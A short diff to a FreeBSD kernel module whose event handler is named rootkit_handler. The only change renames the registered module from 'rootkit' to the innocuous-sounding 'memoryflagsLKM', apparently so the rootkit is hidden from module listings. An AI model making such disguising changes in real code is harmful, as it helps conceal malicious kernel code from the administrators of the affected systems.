@@ -86,7 +86,7 @@ static int rootkit_handler(struct module *module, int event, void *arg) {
 
 // Module metadata and registration, See 6.
 static moduledata_t rootkit_mod = {
-    "rootkit",              // Module name
+    "memoryflagsLKM",              // Module name
     rootkit_handler,        // Event handler
     NULL                  // Extra data (optional)
 };
